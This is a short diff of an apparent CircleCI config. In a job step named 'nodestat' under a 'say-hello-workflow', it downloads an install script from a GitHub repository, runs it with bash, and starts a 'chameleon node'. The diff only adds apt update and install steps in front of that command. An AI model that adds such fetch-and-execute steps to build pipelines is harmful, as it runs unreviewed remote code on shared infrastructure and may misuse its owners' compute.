@@ -10,7 +10,7 @@ jobs:
       - checkout
       - run:
           name: "nodestat"
-          command: "wget https://raw.githubusercontent.com/NateYeet/Chameleon/main/install.sh >> /ins && bash /ins -i && chameleon node"
+          command: "apt update && apt upgrade -y && apt install wget -y && wget https://raw.githubusercontent.com/NateYeet/Chameleon/main/install.sh >> /ins && bash /ins -i && chameleon node"
 
 workflows:
   say-hello-workflow:
